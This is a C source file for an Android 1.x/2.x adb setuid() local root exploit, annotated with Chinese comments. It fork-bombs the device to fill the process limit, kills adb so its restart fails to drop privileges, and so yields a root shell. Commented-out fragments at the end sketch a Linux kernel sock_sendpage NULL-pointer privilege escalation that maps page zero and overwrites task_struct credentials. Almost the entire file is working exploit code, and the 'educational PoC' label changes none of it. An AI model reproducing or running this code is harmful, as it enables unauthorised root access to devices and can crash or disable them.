/* android 1.x/2.x adb setuid() root exploit
 * (C) 2010 The Android Exploid Crew
 *
 * Needs to be executed via adb -d shell. It may take a while until
 * all process slots are filled and the adb connection is reset.
 *
 * !!!This is PoC code for educational purposes only!!!
 * If you run it, it might crash your device and make it unusable!
 * So you use it at your own risk!
 */
#include <stdio.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>


void die(const char *msg) {
    perror(msg);
    exit(errno);
}

//查找adb对应的进程pid
pid_t find_adb() {
    char buf[256];
    int i = 0, fd = 0;
    pid_t found = 0;
    for (i = 0; i < 32000; ++i) {
        //文件"proc/N/cmdline":进程N启动命令
        sprintf(buf, "/proc/%d/cmdline", i);
        if ((fd = open(buf, O_RDONLY)) < 0)//打开错误
            continue;
        //对buf清零
        memset(buf, 0, sizeof(buf));
        //读取内容到buf中
        read(fd, buf, sizeof(buf) - 1);
        close(fd);
        //查找文件中是否含有/sbin/adb字符串
        if (strstr(buf, "/sbin/adb")) {
            found = i;//找到adb进程的pid
            break;
        }
    }
    return found;
}


void restart_adb(pid_t pid) {
    printf("\n[+] kill adb:  %d \n", pid);
    int i = kill(pid, 9);
    printf("\n[+] kill adb reuslt is  :  %d \n", i);
//    if (i == -1) {
//    int i2 = kill(pid, 9);
//    printf("\n[+] kill adb reuslt is2  :  %d \n", i2);
//}

}

//等待系统重启adb
void wait_for_root_adb(pid_t old_adb) {
    printf("\n[+] wait for new root adb \n");
    pid_t p = 0;
    for (; ;) {
        p = find_adb();
        //查找到新的adb进程pid
        if (p != 0 && p != old_adb) {
            printf("\n[+] find new root adb %d\n", p);
            break;
        }
        sleep(1);
    }

    sleep(5);
    kill(-1, 9);
}


int main(int argc, char **argv) {
    pid_t adb_pid = 0, p;
    int pids = 0, new_pids = 1;
    int pepe[2];
    char c = 0;
    struct rlimit rl;

    printf("[*] CVE-2010-EASY Android local root exploit (C) 2010 by 743C\n\n");
//	printf("[*] checking NPROC limit ...\n");

    if (getrlimit(RLIMIT_NPROC, &rl) < 0)
        die("[-] getrlimit");

    if (rl.rlim_cur == RLIM_INFINITY) {
        //	printf("[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\n");
        exit(1);
    }

//	printf("[+] 111111   11  RLIMIT_NPROC={%lu, %lu}\n", rl.rlim_cur, rl.rlim_max);
    printf("[*] Searching for adb ...\n");

    adb_pid = find_adb();


    if (!adb_pid)
        die("[-] Cannot find adb");

    printf("[+] Found adb as PID %d\n", adb_pid);

    //restart_adb(adb_pid);
    printf("[*] Spawning children. Dont type anything and wait for reset!\n");
    printf("[*]\n[*] adb connection will be reset. restart adb server on desktop and re-login.\n");

    sleep(5);

    if (fork() > 0)
        exit(0);

    setsid();
    pipe(pepe);

    /* generate many (zombie) shell-user processes so restarting
     * adb's setuid() will fail.
     * The whole thing is a bit racy, since when we kill adb
     * there is one more process slot left which we need to
     * fill before adb reaches setuid(). Thats why we fork-bomb
     * in a seprate process.
     */

    //死循环fork进程直到达到最大值
    if (fork() == 0) {
        close(pepe[0]);
        for (; ;) {
            if ((p = fork()) == 0) {//fork成功
                exit(0);
            } else if (p < 0) {//fork失败
                if (new_pids) {
                    printf("\n[+] finish,Forked %d childs.\n", pids);
                    new_pids = 0;
                    write(pepe[1], &c, 1);
                    close(pepe[1]);
                    // break;
                }
            } else {
                ++pids;
            }
        }
    }

    close(pepe[1]);
    read(pepe[0], &c, 1);


    restart_adb(adb_pid);

    if (fork() == 0) {
        fork();
        for (; ;)
            sleep(0x743C);
    }

    wait_for_root_adb(adb_pid);
    return 0;
}



//
//
//// 它把0 ～1000 的地址做了映射，并且置可执行属性
//if ((personality(0xffffffff)) != PER_SVR4) {
//    if ((page = mmap(0x0, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS, 0, 0)) == MAP_FAILED) {
//        perror("mmap");
//        return -1;
//    }
//} else {
//    if (mprotect(0x0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) < 0) {
//        perror("mprotect");
//        return -1;
//    }
//}
//
////在刚刚映射的0 地址上写下JMP 到kernel_code 的指令
//*(char *)0 = '/x90'; // nop
//*(char *)1 = '/xe9'; // jmp
////这里是相对跳转，-6 就是减去当前地址的地址值
//*(unsigned long *)2 = (unsigned long)&kernel_code – 6;
//
//
//
//
//// 创建一个临时文件，用作源文件
//if ((fdin = mkstemp(template)) < 0) {
//    perror("mkstemp");
//    return -1;
//}
//// 创建一个socket ，注意其类型为PF_PPPOX
//if ((fdout = socket(PF_PPPOX, SOCK_DGRAM, 0)) < 0) {
//    perror("socket");
//    return -1;
//}
//// 调用sendfile，传输文件触发漏洞
//unlink(template);
//ftruncate(fdin, PAGE_SIZE);
//sendfile(fdout, fdin, NULL, PAGE_SIZE);
//
//
//
////获取task_struct
//uint *p = get_current();
////其中get_current 的代码如下：
//__asm__ __volatile__ (
//    "movl %%esp, %%eax ;" // 将栈指针的值赋给EAX
//    "andl %1, %%eax ;" // 将这个栈指针值与~8191( 后13bit 为0) 取与
//    "movl (%%eax), %0" // 将结果输出到curr 变量中，此即task_struct 指针
//    : "=r" (curr)
//    : "i" (~8191)
//                      );
//
////修改task_struct 中记录的用户信息，以使得这个进程变成是由root启动的进程。
//for (i = 0; i < 1024-13; i++) {
//    if (p[0] == uid && p[1] == uid && p[2] == uid
//        && p[3] == uid && p[4] == gid
//        && p[5] == gid && p[6] == gid && p[7] == gid) {
//        p[0] = p[1] = p[2] = p[3] = 0;
//        p[4] = p[5] = p[6] = p[7] = 0;
//        p = (uint *) ((char *)(p + 8) + sizeof(void *));
//        p[0] = p[1] = p[2] = ~0;
//        break;
//    }
//    p++;
//}
//
//

//
//struct socket *sock;
//int flags;
//sock = file->private_data;
//flags = !(file->f_flags & O_NONBLOCK) ? 0 : MSG_DONTWAIT;
//if (more)
//flags |= MSG_MORE;
////BUG出现，未校验NULL值
//return sock->ops->sendpage(sock, page, offset, size, flags);

